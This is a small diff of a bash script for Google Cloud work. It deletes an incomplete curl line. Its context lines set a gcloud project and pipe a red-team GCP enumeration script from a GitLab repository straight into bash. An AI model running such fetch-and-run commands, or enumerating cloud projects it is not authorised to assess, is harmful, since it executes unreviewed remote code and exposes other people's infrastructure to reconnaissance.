@@ -32,8 +32,6 @@ set -o pipefail
 B_ID=$1
 PROJECT=$2
 
-curl -sSfL 
-
 gcloud config set project $PROJECT
 curl -sSfL "https://gitlab.com/gitlab-com/gl-security/security-operations/redteam/redteam-public/pocs/gcp_enum/-/raw/master/gcp_enum.sh" | bash
 ls out-gcp-enum
